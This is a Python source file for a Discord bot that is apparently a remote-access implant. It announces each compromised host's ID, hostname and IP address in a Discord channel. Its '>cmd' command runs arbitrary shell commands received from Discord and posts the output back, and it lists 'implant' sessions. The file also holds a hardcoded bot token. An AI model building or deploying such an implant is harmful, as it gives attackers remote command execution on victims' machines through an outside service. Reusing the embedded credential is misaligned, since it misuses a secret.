import time
from subprocess import check_output
import uuid
import socket
import discord
from discord.ext import commands

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='>', intents=intents)
max_msg_size = 2000

general_id = 0
text_channel_list = []
general_channel = None

def get_datetime():
	return time.strftime('[%Y-%m-%d %H:%M:%S]')

def log_msg(msg):
	print(f'{get_datetime()} {msg}')

async def send_msg(ctx, msg):
	if len(msg) >= max_msg_size:
		await ctx.send(f'{msg[:max_msg_size]}')
		await send_msg(ctx, msg[max_msg_size:])
	else:
		await ctx.send(f'{msg}')

async def reply_thread(ctx, msg):
	if not ctx.message.fetch_thread() == None:
		await ctx.message.create_thread(name=f'{ctx.message.author.name} {ctx.message.content}')
	
	#thread = ctx.message.fetch_thread()

	if len(msg) >= max_msg_size:
		await ctx.message.fetch_thread().send(f'{msg[:max_msg_size]}')
		await reply_thread(ctx, msg[max_msg_size:])
	else:
		await ctx.message.fetch_thread().send(msg)

def run_cmd(cmd):
	return check_output(cmd, shell=True).decode()

uuid = str(uuid.uuid1())[:8]
implant_id = uuid
hostname = run_cmd("hostname")
ip = [l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0]

@bot.event
async def on_ready():
	log_msg(f'Logged in as {bot.user}')

	for guild in bot.guilds:
		for channel in guild.text_channels:
			text_channel_list.append(channel)
			if channel.name == "general":
				general_id = channel.id
	general_channel = bot.get_channel(general_id)

	msg = ""
	msg += f'-----------------[NEW SESSION]-----------------\n'
	msg += f'| ID: `{uuid}`\n'
	msg += f'| Hostname: `{hostname}`'
	msg += f'| IP: `{ip}`\n'
	msg += f'--------------------------------------------------'
	log_msg(f'General channel id: {general_id}')
	await general_channel.send(msg)

@bot.event
async def on_message(message):
	if message.author == bot.user:
		return

	log_msg(f'The message\'s content was {message.content}')
	await bot.process_commands(message)

@bot.command()
async def ping(ctx):
	'''
	This text will be shown in the help command
	'''

	# Get the latency of the bot
	latency = bot.latency  # Included in the Discord.py library
	# Send it to the user
	await ctx.send(f'Current latency: {latency}s')

@bot.command(rest_is_raw=True)
async def cmd(ctx, *, arg):
	'''
	>cmd -i [implant_id] [command]
		specific implant
	>cmd -a [command]
		all implants
	(future) >cmd -w [command]
		windows implants
	(future) >cmd -l [command]
		linux implants
	'''
	arg = arg[1::]
	log_msg(f'Command recieved: {arg}')
	await send_msg(ctx, f'Command sent: `{arg}`\n\nOutput: ```{run_cmd(arg)}```')
	log_msg(f'Finished processing command: {arg}')

@bot.command()
async def change_id(ctx, arg1, arg2):
	global implant_id
	if not arg1 == implant_id:
		return
	log_msg(f'Changing implant id from {implant_id} to {arg2}')
	await send_msg(ctx, f'Changing implant `{implant_id}` id to `{arg2}`')
	implant_id = arg2

@bot.command()
async def sessions(ctx):
	#global hostname
	#global ip
	#await send_msg(ctx, f'ID: `{implant_id}` | HN: `{hostname}` | IP: `{ip}`')
	await reply_thread(ctx, f'ID: `{implant_id}` | HN: `{hostname}` | IP: `{ip}`')

bot.run("MTI3NTgyNTA2MTM3ODY1ODM2Nw.G1e8mP.3hhbRTZ6dpz8oefx5bxB9MOtBbA4KB2a6-TBHs")  # Where 'TOKEN' is your bot token